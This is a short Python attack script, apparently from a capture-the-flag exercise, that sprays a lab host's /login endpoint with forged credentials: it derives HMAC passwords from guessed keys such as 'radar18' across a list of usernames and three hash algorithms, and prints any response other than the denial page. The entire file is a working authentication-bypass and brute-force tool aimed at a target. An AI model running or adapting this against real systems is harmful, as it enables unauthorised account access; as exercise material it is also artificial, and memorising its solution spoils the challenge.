#!/usr/bin/env python3
# Spray /login on Coastal radar (8448). YOU run this against the target; it only tries
# to authenticate (login attempts are NOT the capped flag submissions). Prints any
# response whose body differs from the baseline "denied" page.
# Scheme hint (docs/protocol.txt): key = "radar" padded with station 18 -> "radar18".
# Model under test: p = HMAC(key, u).  If it works, any username can be forged.
import hmac, hashlib, urllib.request, urllib.parse, re

HOST = "http://10.10.10.22:8448/login"

usernames = [
    "admin", "radar", "operator", "calib", "calibrator", "calibration",
    "station", "station18", "s18", "coastal", "watch", "tech", "sentry",
    "radaruser", "radar18", "cal", "desk", "sensor", "user", "root",
]
# "pads the key with the station number" -> try append / prepend / width-padded
keys = ["radar18", "18radar", "radar-18", "radar_18", "radar018", "radar", "radar 18"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5}

def post(u, p):
    data = urllib.parse.urlencode({"u": u, "p": p}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(HOST, data=data), timeout=5)
        return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def tail(body):
    m = re.search(r'skin-radar-cal"><p>RADAR CALIBRATION</p>(.*?)</div>', body, re.S)
    return (m.group(1) if m else body[:200]).strip()

# baseline marker to filter out
BASE = "denied"
seen = set()
for u in usernames:
    for k in keys:
        for name, h in algos.items():
            p = hmac.new(k.encode(), u.encode(), h).hexdigest()
            code, body = post(u, p)
            t = tail(body)
            if t == BASE:
                continue
            key = (t[:80])
            if key in seen:
                continue
            seen.add(key)
            print(f"[{code}] u={u!r} key={k!r} {name} p={p[:16]}... -> {t[:160]!r}")
print("done. (only non-'denied' responses shown above)")
